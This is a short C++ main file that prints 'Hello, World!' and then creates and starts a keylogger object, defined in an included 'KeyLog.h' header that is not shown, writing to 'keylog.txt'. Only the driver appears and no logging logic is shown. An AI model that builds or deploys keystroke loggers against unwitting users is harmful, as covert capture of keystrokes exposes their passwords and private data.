#include <iostream>
#include "KeyLog.h"

int main() {
    std::cout << "Hello, World!" << std::endl;

  KeyLog keylogger( "keylog.txt");
  keylogger.start();
  return 0;
}
